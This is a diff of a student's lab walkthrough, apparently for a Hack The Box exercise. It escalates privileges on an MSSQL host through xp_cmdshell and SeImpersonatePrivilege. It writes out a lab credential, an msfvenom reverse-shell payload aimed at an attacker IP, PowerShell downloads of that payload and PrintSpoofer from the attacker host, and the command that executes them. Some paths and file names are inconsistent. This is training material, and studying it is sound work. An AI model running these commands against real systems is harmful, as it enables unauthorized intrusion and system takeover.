@@ -200,9 +200,76 @@ netdb
 #### Question 7: Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
 
 ```go
-python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60 --windows-auth
+python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
 ```
 
 ```go
 EXEC xp_cmdshell 'type "C:\\Users\\Administrator\\Desktop\\flag.txt"';
 ```
+
+I don't have the correct privileges
+![[Pasted image 20260610065348.png]]
+
+Verify privileges
+```go
+EXEC xp_cmdshell 'whoami /priv';
+```
+
+![[Pasted image 20260610071915.png]]
+
+
+>[!Important] SeImpersonatePrivilege
+The permission "SeImpersonatePrivilege" is enabled. It allows a process to assume the security context (identity and permissions) of another user or account. By default, it is assigned to local Administrators and Service accounts.
+>
+> The permission is often used by the Print Spooler to abuse special privileges and priv esc a standard user. To execute this attack generate an msfvenom payload and download the [PrintSpoofer](https://github.com/itm4n/printspoofer)
+
+Download the executable and scp to htb-student
+```go
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
+```
+
+```go
+scp PrintSpoofer32.exe htb-student@10.129.25.29:~/
+```
+
+Generate msfvenom payload
+```go
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=9999 -o payload.exe
+```
+
+Start netcat on htb-student
+```go
+nc -nlvp 9999
+```
+
+Connect to SQL01
+```go
+python3 /usr/local/bin/mssqlclient.py inlanefrieght/netdb:'D@ta_bAse_adm1n!'@172.16.7.60
+```
+
+
+On the SQL01 Host, download the files using PowerShell
+
+Is there a public folder present?
+```go
+EXEC xp_cmdshell 'dir C:\Public\Users';
+```
+
+```go
+EXEC xp_cmdshell 'cd C:\Public\Users && dir';
+```
+
+```go
+EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://172.16.7.240:8888/payload.exe -OutFile C:\Users\Public\payload.exe"';
+```
+
+```go
+EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri ''http://172.16.7.240:8888/PrintSpoofer64.exe'' -OutFile ''C:\Users\Public\PrintSpoofer64.exe''"';
+```
+
+Execute
+```go
+EXEC xp_cmdshell 'C:\Public\Users\PrinterSpoofer64.exe -c C:\Public\Users\payload.exe' 
+```
+
+![[Pasted image 20260610175450.png]]
